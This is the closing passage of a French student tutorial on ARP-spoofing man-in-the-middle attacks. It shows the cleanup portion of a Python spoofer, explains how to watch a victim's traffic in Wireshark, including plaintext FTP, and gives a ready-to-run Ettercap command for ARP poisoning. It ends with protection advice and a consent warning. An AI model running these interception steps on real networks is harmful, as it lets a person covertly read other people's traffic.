    restore<span class="token punctuation">(</span>gateway_ip<span class="token punctuation">,</span> target_ip<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Disabling IP forwarding"</span><span class="token punctuation">)</span>
    <span class="token comment">#Disable IP Forwarding on a mac</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo sysctl -w net.inet.ip.forwarding=0"</span><span class="token punctuation">)</span>
    <span class="token comment">#kill process on a mac</span>
    os<span class="token punctuation">.</span>kill<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> signal<span class="token punctuation">.</span>SIGTERM<span class="token punctuation">)</span>
</code></pre>
<p><strong>Note</strong> : Désactivez votre VPN, certains bloquent la retransmission de paquets.</p>
<p>L'attaque est maintenant réussi : en plus d'avoir modifier le cache ARP de la victime, vous transferez tous ses paquets vers leur destinataire, et renvoyer la réponse. Vous pouvez observer les connexions dans Wireshark. La cible ne se rendra compte de rien :  tous ses paquets sont transférés normalement de son point de vue.</p>
<p>Bien sûr, si la cible transfère ses paquets en utilisant TLS (ex: https), les paquets seront chiffrés. Mais vous pourrez tout de même observer à quel ressource la cible accède, ce qui est un probème sérieux de confidentialité. Et si le protocole n'est pas sécurisé, vous pourrez lire tous les messages en clair...</p>
<p>Par exemple, pour des paquets transmis avec FTP :</p>
<p><img src="wireshark_transmited.png" alt="wireshark_FTP"></p>
<p><strong>Ps</strong> : avec une machine virtuelle, vos paquets auront de toute façon été capté par wireshark, car ils passent par la carte réseau de votre machine hôte. Cette démonstration sur machine virtuelle est un peu artificielle mais permet de bien comprendre le processus. Elle serait tout à fait similaire sur un appareil réel.</p>
<h2>Avec Ettercap</h2>
<p>Vous avez un tuto sur Ettercap et Wireshark assez facile <a href="https://www.youtube.com/watch?v=-rSqbgI7oZM&amp;ab_channel=NetworkChuck">ici</a>.</p>
<p><a href="https://en.wikipedia.org/wiki/Ettercap_(software)">Ettercap</a> est un logiciel de sécurité réseau qui permet d'intercepter le trafic réseau. Il permet également de faire des attaques de type arp spoofing, sans avoir à implémenter quoi que ce soit. Avec la commande suivante :</p>
<p><code>sudo ettercap -T -S -i en0 -M arp:remote /&lt;gateway-ip&gt;// /&lt;target-ip&gt;//</code></p>
<p>-T : text<br>
-S : sans SSL<br>
-i : précisez votre interface réseau<br>
-M : mode</p>
<p>Tout le trafic est intercepté et redirigé ; vous pouvez observer tous les paquets simplement dans wireshark (fiters : ip.addr = &lt;<em>target-ip</em>&gt; ; http ; TLS... amusez-vous !).</p>
<h2>Pour se protéger</h2>
<p>Vous êtes très vulnérable sur un réseau wifi public. Quelques recommandations :</p>
<ul>
<li>Utilisez un VPN, vos paquets seront chiffrés.</li>
<li>Ne partagez pas votre code wifi à n'importe qui, et sécurisez votre réseau wifi.</li>
<li>Certains anti-virus / logiciels de sécurité bloquent les paquets ARP douteux.</li>
<li>Il existe des IDS bloquant les paquets ARP douteux.</li>
<li>...</li>
</ul>
<p><em>Surtout, ne pratiquez pas sans l'accord de la cible et de l'administrateur réseau !</em></p>
<h2>Sources</h2>
<ul>
<li>Dharmil Chhadva : Man In The Middle Attack (MITM) Part 1 — ARP Spoofing : <a href="https://levelup.gitconnected.com/man-in-the-middle-attack-part-1-arp-spoofing-6f5b174dec59">https://levelup.gitconnected.com/man-in-the-middle-attack-part-1-arp-spoofing-6f5b174dec59</a></li>
<li>rameshaditya2001 : Python – How to create an ARP Spoofer using Scapy? : <a href="https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/">https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/</a></li>
<li>Florian Burnel : Virtualisation – Les types de connexion au réseau : <a href="https://www.it-connect.fr/virtualisation-les-types-de-connexion-au-reseau#IV_Le_type_Host-Only">https://www.it-connect.fr/virtualisation-les-types-de-connexion-au-reseau#IV_Le_type_Host-Only</a></li>
<li>Ismail Akkila : Black Hat Python — ARP Cache Poisoning with Scapy : <a href="https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242">https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242</a></li>
</ul>


</article>

    </main>

    <footer class="min-h-[50px] border-t-2 border-gray-200 mt-4">
      <div class="max-w-[1000px] mx-auto px-4">
        <div class="min-h-[50px] flex justify-center items-center">
          <p>
            do-it : option de troisième année à l'école centrale Marseille
          </p>
        </div>
      </div>
    </footer>

    <script>
      MathJax
        .startup
        .document
        .getMathItemsWithin(document.body);
    </script>

  </body>
</html>
